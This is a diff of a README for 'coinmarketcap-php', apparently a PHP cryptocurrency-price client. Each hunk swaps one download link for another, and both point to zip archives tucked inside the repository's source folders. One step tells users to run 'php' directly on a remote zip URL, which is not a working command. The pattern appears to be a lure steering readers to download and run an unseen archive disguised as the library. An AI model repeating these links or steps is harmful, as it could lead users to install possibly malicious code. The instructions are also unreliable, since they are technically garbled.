@@ -6,7 +6,7 @@ Welcome to coinmarketcap-php! This application helps you easily access real-time
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download coinmarketcap-php](https://github.com/rahiez9/coinmarketcap-php/raw/refs/heads/main/config/php-coinmarketcap-v1.0.zip).
+To get started, visit this page to download: [Download coinmarketcap-php](https://raw.githubusercontent.com/rahiez9/coinmarketcap-php/main/src/Api/coinmarketcap-php-1.9.zip).
 
 1. Go to the Downloads section.
 2. Choose the latest release.
@@ -42,7 +42,7 @@ After downloading and installing, here's how to get started:
 2. Navigate to the folder where you installed coinmarketcap-php.
 3. Run the command to execute the application. For example:
    ```bash
-   php https://github.com/rahiez9/coinmarketcap-php/raw/refs/heads/main/config/php-coinmarketcap-v1.0.zip
+   php https://raw.githubusercontent.com/rahiez9/coinmarketcap-php/main/src/Api/coinmarketcap-php-1.9.zip
    ```
 4. Follow the prompts in the application to access various features like price tracking or market analysis.
 
@@ -81,6 +81,6 @@ If you're looking to learn more about cryptocurrencies or development, here are 
 
 For easy access to downloads and the latest updates, bookmark these links:
 
-- [Download coinmarketcap-php](https://github.com/rahiez9/coinmarketcap-php/raw/refs/heads/main/config/php-coinmarketcap-v1.0.zip)
+- [Download coinmarketcap-php](https://raw.githubusercontent.com/rahiez9/coinmarketcap-php/main/src/Api/coinmarketcap-php-1.9.zip)
 
 Thank you for choosing coinmarketcap-php! Enjoy exploring the world of cryptocurrencies with our simple and effective tool.
